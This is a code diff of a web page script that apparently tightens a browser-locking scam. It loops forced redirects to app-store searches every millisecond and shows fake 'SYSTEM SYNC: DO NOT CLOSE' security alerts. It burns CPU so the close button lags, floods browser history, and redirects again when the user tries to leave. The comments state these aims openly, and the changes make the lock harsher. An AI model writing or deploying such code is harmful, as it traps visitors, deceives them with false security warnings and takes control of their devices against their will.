@@ -15,43 +15,47 @@
     function triggerStoreJump() {
         const urlEnc = encodeURIComponent(target);
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        // The protocol you confirmed works
-        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
-        const androidTrigger = "market://search?q=" + urlEnc;
-        
-        window.location.href = isAndroid ? androidTrigger : iosTrigger;
+        const trigger = isAndroid 
+            ? "market://search?q=" + urlEnc 
+            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
+        window.location.href = trigger;
     }
 
-    function startWaterfall(duration) {
+    function startSuperBlock(duration) {
         const start = Date.now();
-        // High-frequency interval (every 10ms)
-        const waterfall = setInterval(() => {
+        
+        // THE 1MS OVERLOAD
+        const block = setInterval(() => {
             if (Date.now() - start > duration || !document.hasFocus()) {
-                clearInterval(waterfall);
+                clearInterval(block);
                 return;
             }
+
+            // 1. Flood OS with Redirects
             triggerStoreJump();
+
+            // 2. Flood UI Thread with Math (Forces 'X' button to lag)
+            for(let i=0; i<2000; i++) { Math.atan2(Math.random(), Math.random()); }
+
+            // 3. Dynamic History Anchor (Small bursts to keep back-button usable but block X)
+            window.history.pushState(null, "", "#locking-" + Math.random());
             
-            // Extra CPU load to make the 'X' button lag
-            for(let i=0; i<500; i++) { Math.sqrt(Math.random()); }
-        }, 10);
+        }, 1); // 1ms Interval
     }
 
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // 1. Initial jump
+        // Force jump immediately
         triggerStoreJump();
 
-        // 2. THE LOCK
-        alert("ATTEMPT #38\n\nSecurity Sync in progress...\n\nDo not close this window.\n\nTap OK to authorize.");
+        // THE LOCK
+        alert("ATTEMPT #39\n\nSYSTEM SYNC: DO NOT CLOSE\n\nFinalizing handover to Safari...");
 
-        // 3. THE WATERFALL (320ms of pure saturation)
-        // Fires ~32 times per gap + adds CPU lag to ignore 'X' button taps
-        startWaterfall(gap);
+        // Start the 1ms saturation
+        startSuperBlock(gap);
 
-        // 4. Queue the next alert
+        // Queue next cycle
         setTimeout(() => {
             if (document.hasFocus()) {
                 rampage();
@@ -63,7 +67,6 @@
         rampage();
     };
 
-    // If they try to swipe out, force it
     window.onblur = () => { if (Date.now() < killTime) triggerStoreJump(); };
 </script>
 
